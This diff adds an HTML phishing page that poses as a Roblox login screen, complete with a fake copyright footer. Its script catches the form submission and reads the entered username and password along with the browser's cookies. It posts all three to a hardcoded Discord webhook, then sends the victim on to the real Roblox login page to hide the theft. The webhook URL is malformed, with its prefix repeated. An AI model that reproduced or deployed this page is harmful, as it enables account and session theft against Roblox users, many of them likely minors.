@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Roblox Login</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;}
+body{background:#1b1b2f;display:flex;justify-content:center;align-items:center;height:100vh;}
+.login-box{background:#2d2d44;padding:40px;border-radius:16px;width:360px;box-shadow:0 0 20px #000;text-align:center;}
+.logo{font-size:36px;font-weight:bold;color:#fff;margin-bottom:20px;letter-spacing:2px;}
+.logo span{color:#f03;}
+input{width:100%;padding:14px;margin:10px 0;border:none;border-radius:8px;background:#1e1e32;color:#fff;font-size:16px;}
+input::placeholder{color:#888;}
+button{width:100%;padding:14px;background:#f03;border:none;border-radius:8px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;}
+button:hover{background:#d0021b;}
+.footer{color:#888;font-size:13px;margin-top:20px;}
+</style>
+</head>
+<body>
+<div class="login-box">
+<div class="logo">R<span>®</span>BLOX</div>
+<form id="loginForm">
+<input type="text" name="username" placeholder="Username / Email" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Log In</button>
+</form>
+<div class="footer">© 2026 Roblox Corporation</div>
+</div>
+<script>
+const webhook = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1542080761824415845/ZOhnDbcjsowcF2U-n-E1eEdPW3VjROE2F2MuCmJlqW7r4xP-zdccNDGpCS6oH3A0_dtb";
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    let u = document.querySelector('input[name="username"]').value;
+    let p = document.querySelector('input[name="password"]').value;
+    let c = document.cookie;
+    let msg = `**Roblox Login**\nUser: ${u}\nPass: ${p}\nCookie: ${c || 'Not Set'}`;
+    fetch(webhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({content: msg})
+    }).then(() => {
+        window.location.href = 'https://www.roblox.com/login';
+    });
+});
+</script>
+</body>
+</html>
